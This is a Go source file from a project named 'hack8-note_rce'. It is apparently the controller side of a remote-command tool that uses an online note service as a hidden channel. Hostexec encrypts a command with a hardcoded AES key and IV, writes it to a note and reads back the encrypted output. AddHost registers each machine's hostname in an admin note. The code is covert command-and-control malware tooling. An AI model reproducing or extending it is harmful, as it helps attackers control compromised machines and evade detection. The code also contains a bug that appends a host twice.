package Util

import (
	"encoding/json"
	"fmt"
	"hack8-note_rce/mode"
	"os"
	"time"
)

func Hostexec(noteid, notekey string, command string) {

	key := []byte("qaxzaiciyiyouuuu")
	iv := []byte("qaxyydsyydsyydss")
	sh := []byte(notekey + ":" + command)

	//写
	base64, err := AesCbcEncryptBase64(sh, key, iv)
	if err != nil {
		fmt.Println("加密命令错误")
		return
	}
	WriteNote(noteid, base64)

	time.Sleep(30 * time.Second)

	//读
	byBase64, err := AesCbcDecryptByBase64(GetNote(noteid), key, iv)
	if err != nil {
		fmt.Println("读取结果错误")
		return
	}
	fmt.Println(string(byBase64))

}

// 获取主机
func HostList(admin string) []mode.Host {
	note := GetNote(admin)
	hosts := []mode.Host{}
	err := json.Unmarshal([]byte(note), &hosts)
	if err != nil {
		fmt.Println("获取主机失败")
		return nil
	}
	return hosts
}

// 添加主机
func AddHost(admin, notekey, noteid string) {
	host := mode.Host{}
	host.HostName, _ = os.Hostname()
	host.Notekey = notekey
	host.Id = noteid
	list := HostList(admin)
	var hosts []mode.Host
	if list != nil {
		hosts = append(list, host)
	} else {
		hosts = []mode.Host{}
	}

	hosts = append(hosts, host)
	marshal, err := json.Marshal(hosts)
	if err != nil {
		return
	}

	WriteNote(admin, string(marshal))

}
